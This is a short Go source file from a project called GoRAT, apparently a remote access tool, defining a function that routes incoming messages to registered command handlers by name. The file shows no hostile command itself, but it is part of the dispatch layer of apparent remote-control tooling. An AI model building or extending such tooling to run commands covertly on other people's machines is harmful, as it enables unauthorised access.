// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package commands

import "strings"

// HandleCommand handles commands
func HandleCommand(message []byte) (string, string) {
	str := string(message)
	cmdName := strings.Split(str, " ")[0]

	for _, v := range commands {
		if v.Identifier == cmdName {
			return string(v.Function(message)), cmdName
		}
	}

	return "INVALID", "INVALID"
}
